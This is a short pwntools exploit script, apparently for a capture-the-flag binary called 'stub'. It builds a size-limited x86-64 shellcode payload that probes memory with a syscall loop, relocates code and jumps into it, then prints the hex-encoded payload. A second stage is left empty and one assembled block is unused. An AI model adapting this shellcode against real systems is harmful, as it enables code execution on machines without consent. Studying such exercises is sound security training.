from pwn import *
from binascii import hexlify


e = ELF("./stub")

context.binary = e.path

pay = "\xf1" + asm("""
  pop rdi
  mov rdi, 0x100000000ff0	

a:
  add rdi, 0x1000
  
  push 35
  pop rax
  syscall

  cmp al, 0
  jne a

  sub rdi, 0xff0-194
  
  lea rsi, [rip+0x100]
  mov r10, rsi
  mov r12, rsi

  jmp rdi
""")

asm("""
  lea rax, [rip]
  mov rdi, [rax-0x10]

  add rdi, 0x1000-194

  mov rsi, rax
  add rsi, 0x100

  mov rcx, 0x100

  rep movsq

  mov r10, rdi
  mov r12, r10

  sub rdi, 0x1000-194
  jmp rdi
""")

stage2 = asm("""
  

""")

# 56 limit
print(str(len(pay)) + "/56")

goal = hexlify(flat({0: pay, 0x38+8: 0}, filler=b'\x90'))


print(goal)
